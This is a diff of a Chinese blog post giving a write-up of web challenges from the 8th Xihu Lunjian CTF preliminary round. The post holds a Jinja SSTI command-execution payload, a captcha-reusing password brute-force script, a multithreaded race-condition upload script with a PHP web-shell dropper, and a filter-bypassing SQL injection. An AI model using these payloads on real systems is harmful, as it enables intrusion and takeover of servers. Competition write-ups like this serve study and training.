@@ -22,17 +22,17 @@
     <meta name="description" content="Rank-l 可能是ssti，过滤了一些东西，如果触发过滤，输入密码的页面会直接302 过滤了空格，用request.args.aaa可以参数逃逸。 1phone_number&#x3D;&amp;#123;&amp;#123;url_for.__globals__[&amp;#x27;__builtins__&amp;#x27;].__import__(&amp;#x27;os&amp;#x27;).popen(request.args.aaa).re">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第八届西湖论剑初赛web全题解">
-<meta property="og:url" content="http://example.com/2025/01/18/xhlj8/index.html">
+<meta property="og:url" content="http://example.com/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/index.html">
 <meta property="og:site_name" content="Infernity&#39;s Blog">
 <meta property="og:description" content="Rank-l 可能是ssti，过滤了一些东西，如果触发过滤，输入密码的页面会直接302 过滤了空格，用request.args.aaa可以参数逃逸。 1phone_number&#x3D;&amp;#123;&amp;#123;url_for.__globals__[&amp;#x27;__builtins__&amp;#x27;].__import__(&amp;#x27;os&amp;#x27;).popen(request.args.aaa).re">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/img/xhlj8/XHLJ8.png">
+<meta property="og:image" content="http://example.com/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/XHLJ8.png">
 <meta property="article:published_time" content="2025-01-18T08:16:46.000Z">
-<meta property="article:modified_time" content="2025-01-20T02:31:55.151Z">
+<meta property="article:modified_time" content="2025-03-13T11:58:46.275Z">
 <meta property="article:author" content="Infernity">
 <meta property="article:tag" content="WPs">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/img/xhlj8/XHLJ8.png">
+<meta name="twitter:image" content="http://example.com/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/XHLJ8.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -292,23 +292,23 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h1><p><img src="/img/xhlj8/18ed26dd-7b79-422f-90e0-a0885dd3d9f4.png" srcset="/img/loading.gif" lazyload alt="18ed26dd-7b79-422f-90e0-a0885dd3d9f4"><img src="/img/xhlj8/e823f730-9bc5-44d9-a2b9-a03b075a640c.png" srcset="/img/loading.gif" lazyload alt="e823f730-9bc5-44d9-a2b9-a03b075a640c"></p>
+                <h1 id="Rank-l"><a href="#Rank-l" class="headerlink" title="Rank-l"></a>Rank-l</h1><p><img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/18ed26dd-7b79-422f-90e0-a0885dd3d9f4.png" srcset="/img/loading.gif" lazyload alt="18ed26dd-7b79-422f-90e0-a0885dd3d9f4"><img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/e823f730-9bc5-44d9-a2b9-a03b075a640c.png" srcset="/img/loading.gif" lazyload alt="e823f730-9bc5-44d9-a2b9-a03b075a640c"></p>
 <p>可能是ssti，过滤了一些东西，如果触发过滤，输入密码的页面会直接302</p>
 <p>过滤了空格，用<code>request.args.aaa</code>可以参数逃逸。</p>
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">phone_number=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;__builtins__&#x27;].__import__(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.aaa</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>然后再cpass页面：?aaa&#x3D;ls &#x2F; -al</p>
-<p><img src="/img/xhlj8/a4d93610-c7d2-4716-8708-ce29e2f2b3ac.png" srcset="/img/loading.gif" lazyload alt="a4d93610-c7d2-4716-8708-ce29e2f2b3ac"></p>
-<p>flag有权限读，但是cat无效，可能是把cat移除了，这里用tac读出来。<img src="/img/xhlj8/5e2c6c2e-87e5-4ab0-b532-7eda478c2b92.png" srcset="/img/loading.gif" lazyload alt="5e2c6c2e-87e5-4ab0-b532-7eda478c2b92"></p>
+<p><img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/a4d93610-c7d2-4716-8708-ce29e2f2b3ac.png" srcset="/img/loading.gif" lazyload alt="a4d93610-c7d2-4716-8708-ce29e2f2b3ac"></p>
+<p>flag有权限读，但是cat无效，可能是把cat移除了，这里用tac读出来。<img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/5e2c6c2e-87e5-4ab0-b532-7eda478c2b92.png" srcset="/img/loading.gif" lazyload alt="5e2c6c2e-87e5-4ab0-b532-7eda478c2b92"></p>
 <h1 id="Rank-U"><a href="#Rank-U" class="headerlink" title="Rank-U"></a>Rank-U</h1><p>首先是绕验证码的爆破弱口令，这里用requests库的session来爆破，就只需要识别一次验证码后面可以一直爆破。</p>
 <p>登录的poc：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>yzm_url = <span class="hljs-string">&quot;http://139.155.126.78:26554/captcha.php&quot;</span><br>login_url = <span class="hljs-string">&quot;http://139.155.126.78:26554/&quot;</span><br><br>password_dict = <span class="hljs-string">&quot;密码字典路径&quot;</span><br>open_file = <span class="hljs-built_in">open</span>(password_dict, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment">#拿到密码字典的所有密码</span><br>password = open_file.readlines()<br><br>sess = requests.session()   <span class="hljs-comment">#利用session，只需要保存一次密码</span><br>img = sess.get(yzm_url)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.jpg&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># 先访问一次url，把验证码图片保存下来。</span><br>    f.write(img.content)<br>    f.close()<br><br>os.system(<span class="hljs-string">rf&#x27;&quot;C:\Program Files\Tesseract-OCR\tesseract.exe&quot; 1.jpg test&#x27;</span>)  <span class="hljs-comment"># 识别验证码，结果保存到本地</span><br>answer = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>true_answer = answer.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># 去掉换行和空格</span><br><span class="hljs-comment"># print(true_answer)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(password)):  <span class="hljs-comment">#爆破密码</span><br>    p = password[i].replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: p,<br>        <span class="hljs-string">&quot;yzm&quot;</span>: true_answer<br>    &#125;<br>    res = sess.post(login_url,data=data)       <span class="hljs-comment">#发登录包</span><br>    s = re.findall(<span class="hljs-string">&quot;&lt;p class=&#x27;error&#x27;&gt;(.*)&lt;/p&gt;&quot;</span>,res.text)<br>    <span class="hljs-built_in">print</span>(p)<br>    <span class="hljs-keyword">if</span> s[<span class="hljs-number">0</span>] != <span class="hljs-string">&quot;用户名或密码错误，请重试!&quot;</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure>
 
 <p>爆出来密码是：year2000</p>
 <p>登录进去直接能上传文件，但是好像访问不到，可能是条件竞争？</p>
-<p><img src="/img/xhlj8/20120e94-78bd-4e84-8d73-5ea84882e1ce.png" srcset="/img/loading.gif" lazyload alt="20120e94-78bd-4e84-8d73-5ea84882e1ce"></p>
+<p><img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/20120e94-78bd-4e84-8d73-5ea84882e1ce.png" srcset="/img/loading.gif" lazyload alt="20120e94-78bd-4e84-8d73-5ea84882e1ce"></p>
 <p>只有图片才能被成功上传。</p>
-<p>经过测试发现确实是条件竞争，时间极短，需要很多的线程发包才行，这样又容易造成服务器卡顿，而且文件名是根据时间戳生成的某个字符串，这个题恶心就在这几个点。<img src="/img/xhlj8/ac6f2add-59a4-4535-a894-ef7d86bc12d5.png" srcset="/img/loading.gif" lazyload alt="ac6f2add-59a4-4535-a894-ef7d86bc12d5"></p>
+<p>经过测试发现确实是条件竞争，时间极短，需要很多的线程发包才行，这样又容易造成服务器卡顿，而且文件名是根据时间戳生成的某个字符串，这个题恶心就在这几个点。<img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/ac6f2add-59a4-4535-a894-ef7d86bc12d5.png" srcset="/img/loading.gif" lazyload alt="ac6f2add-59a4-4535-a894-ef7d86bc12d5"></p>
 <p>python多线程发包，发请求，并匹配文件名：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://139.155.126.78:27319&quot;</span><br><br>cookies = &#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;p2j0ol7prsslt2mk8fss4bme2u&quot;</span>&#125;<br>file_path = <span class="hljs-string">r&quot;C:\Users\13664\Desktop\123.php&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    files = &#123;<br>        <span class="hljs-string">&#x27;file_upload&#x27;</span>: (file_path, f.read(), <span class="hljs-string">&#x27;application/octet-stream&#x27;</span>),<br>        <span class="hljs-string">&#x27;filename&#x27;</span>: (<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;123.php&#x27;</span>)<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">threads</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = requests.post(url+<span class="hljs-string">&quot;/admin/index.php&quot;</span>, cookies=cookies,files=files)<br>        <span class="hljs-comment">#print(res.text)</span><br>        s = re.findall(<span class="hljs-string">&quot;&lt;p class=\&quot;success\&quot;&gt;文件上传成功！文件已保存为: (.*)&lt;/p&gt;&quot;</span>,res.text)<br>        file_url = url + <span class="hljs-string">&quot;/admin&quot;</span>+s[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:]<br>        res = requests.get(file_url,cookies=cookies)<br>        <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 启动 100 个线程</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    threading.Thread(target=threads).start()<br></code></pre></td></tr></table></figure>
 
@@ -316,12 +316,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;evil.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php eval(\$_GET[123]);?&gt;&quot;</span>);<br>    &#125;;<br></code></pre></td></tr></table></figure>
 
 <p>为了rce，上传这个php之后访问一次，会生成shell文件，方便rce。</p>
-<p><img src="/img/xhlj8/f70625ce-f9d2-4ef1-9121-9391e307ea83.png" srcset="/img/loading.gif" lazyload alt="f70625ce-f9d2-4ef1-9121-9391e307ea83"></p>
+<p><img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/f70625ce-f9d2-4ef1-9121-9391e307ea83.png" srcset="/img/loading.gif" lazyload alt="f70625ce-f9d2-4ef1-9121-9391e307ea83"></p>
 <p>经过几个小时尝试，才在最后拿到了这个shell文件。然后还ban掉了system和phpinfo等函数，我一度以为我的shell有问题。后面用<code>readfile(&#39;/flag&#39;);</code>来读取flag。</p>
-<p><img src="/img/xhlj8/7b915e00-f765-434f-a4f2-d458eef15d31.png" srcset="/img/loading.gif" lazyload alt="7b915e00-f765-434f-a4f2-d458eef15d31"></p>
+<p><img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/7b915e00-f765-434f-a4f2-d458eef15d31.png" srcset="/img/loading.gif" lazyload alt="7b915e00-f765-434f-a4f2-d458eef15d31"></p>
 <h1 id="sqli-or-not"><a href="#sqli-or-not" class="headerlink" title="sqli or not"></a>sqli or not</h1><p>过滤逗号，单双引号和双斜杠。</p>
 <p>逗号的绕过方式，在上次极客大挑战的某个题中遇到过一次。</p>
-<p><img src="/img/xhlj8/18d48619-0edb-4045-8a09-89141b2b53b3.png" srcset="/img/loading.gif" lazyload alt="18d48619-0edb-4045-8a09-89141b2b53b3"></p>
+<p><img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/18d48619-0edb-4045-8a09-89141b2b53b3.png" srcset="/img/loading.gif" lazyload alt="18d48619-0edb-4045-8a09-89141b2b53b3"></p>
 <p>这样可以绕逗号</p>
 <blockquote>
 <p>info&#x3D;{“username”:”asd”&amp;info&#x3D;”password”:”132”}</p>
@@ -336,7 +336,7 @@
 <p>payload：info&#x3D;{“username”:”$&#96;or 1&#x3D;1%23”&amp;info&#x3D;”password”:”132”}</p>
 <p>经过拼接后：select * from userinfo where username &#x3D; ‘select * from userinfo where username &#x3D; ‘or 1&#x3D;1#’ and password &#x3D; ‘132’</p>
 <p>这样就取到了单引号了。</p>
-<p><img src="/img/xhlj8/c46535d2-c9f4-46d5-b5cf-7cee8f3aedf8.png" srcset="/img/loading.gif" lazyload alt="c46535d2-c9f4-46d5-b5cf-7cee8f3aedf8"></p>
+<p><img src="/img/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/c46535d2-c9f4-46d5-b5cf-7cee8f3aedf8.png" srcset="/img/loading.gif" lazyload alt="c46535d2-c9f4-46d5-b5cf-7cee8f3aedf8"></p>
 
                 
               </div>
@@ -383,7 +383,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>第八届西湖论剑初赛web全题解</div>
-      <div>http://example.com/2025/01/18/xhlj8/</div>
+      <div>http://example.com/2025/01/18/第八届西湖论剑/</div>
     </div>
     <div class="license-meta">
       
